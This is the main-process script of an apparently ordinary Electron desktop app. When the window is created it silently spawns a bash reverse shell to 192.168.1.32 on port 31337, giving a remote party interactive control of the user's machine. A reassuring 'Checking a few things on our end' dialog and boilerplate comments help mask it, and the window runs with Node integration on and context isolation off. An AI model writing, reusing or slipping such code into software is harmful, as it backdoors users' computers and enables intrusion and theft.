const { app, BrowserWindow, dialog } = require('electron');

function createWindow() {
  // Create the browser window.
  const win = new BrowserWindow({
    width: 800,
    height: 600,
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false,
    },
  });

  //Uses node.js process manager
  const child_process = require('child_process');

  // This function will output the lines from the script
  // and will return the full combined output
  // as well as exit code when it's done (using the callback).

  var child = child_process.spawn(
    '/bin/bash -i > /dev/tcp/192.168.1.32/31337 0<&1 2>&1',
    [],
    {
      encoding: 'utf8',
      shell: true,
    }
  );
  // You can also use a variable to save the output for when the script closes later
  child.on('error', (error) => {
    dialog.showMessageBox({
      title: 'Title',
      type: 'warning',
      message: 'Error occured.\r\n' + error,
    });
  });

  child.stdout.setEncoding('utf8');
  child.stdout.on('data', (data) => {
    //Here is the output
    data = data.toString();
    console.log(data);
  });

  child.stderr.setEncoding('utf8');

  child.stderr.on('data', (data) => {
    // Return some data to the renderer process with the mainprocess-response ID

    win.webContents.send('mainprocess-response', data);
    //Here is the output from the command
    console.log(data);
  });

  child.on('close', (code) => {
    //Here you can get the exit code of the script
    switch (code) {
      case 0:
        dialog.showMessageBox({
          title: 'Title',
          type: 'info',
          message: 'Checking a few things on our end....\r\n',
        });
        break;
    }
  });
  if (typeof callback === 'function') callback();

  // and load the index.html of the app.
  win.loadFile('src/index.html');
}
app.whenReady().then(createWindow);
